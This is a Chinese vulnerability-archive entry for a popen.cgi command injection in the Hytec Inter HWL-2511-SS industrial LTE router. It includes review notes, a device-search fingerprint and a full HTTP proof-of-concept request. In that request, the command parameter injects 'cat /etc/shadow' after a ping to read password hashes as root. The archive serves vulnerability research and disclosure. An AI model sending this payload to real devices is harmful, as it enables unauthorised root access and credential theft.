---
source: "wy876 漏洞文库"
id: "vw-ca311ec819d1cd4c2a0004ac"
entity_id: "ve-ca311ec819d1cd4c2a0004ac"
schema_version: "1"
title: "Hytec Inter HWL-2511-SS路由器popen.cgi命令注入漏洞"
product: "Hytec Inter HWL-2511-SS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "工业LTE路由器，无固件/鉴权说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/HytecInter/HytecInterHWL-2511-SS%E8%B7%AF%E7%94%B1%E5%99%A8popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hy5l035eahzzbbys"
source_status: "recorded"
previous_fofa_unverified: "app.name=="
hunter: "app.name==\"PROSCEND(及其他) Celluar Router \""
---

# Hytec Inter HWL-2511-SS路由器popen.cgi命令注入漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hytec Inter HWL-2511-SS
- 本文讨论：popen.cgi command命令注入
- 版本、权限与配置前提：工业LTE路由器，无固件/鉴权说明
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Hunter PROSCEND及其他指纹范围宽，不能自动认定全部同漏洞；元数据截断
- ping -c后数值/目标格式有误，但后续分号命令是独立路径；无响应与root证据
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 型号对应、认证/root及补丁待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Hytec Inter HWL-2511-SS是日本Hytec Inter公司的一种工业 LTE 路由器和 Wi-Fi 接入点。 Hytec Inter HWL-2511-SS popen.cgi存在安全漏洞，允许攻击者以root权限执行任意命令。

# 二、影响版本
+ Hytec Inter HWL-2511-SS

# 三、资产测绘
+ hunter`app.name=="PROSCEND(及其他) Celluar Router "`


+ 登录页面


# 四、漏洞复现
```http
GET /cgi-bin/popen.cgi?command=ping%20-c%201.1.1.1;cat%20/etc/shadow&v=0.130303344313792 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Sun, 13 Oct 2019 19:17:17 GMT
If-None-Match: "18111784"
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hy5l035eahzzbbys>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
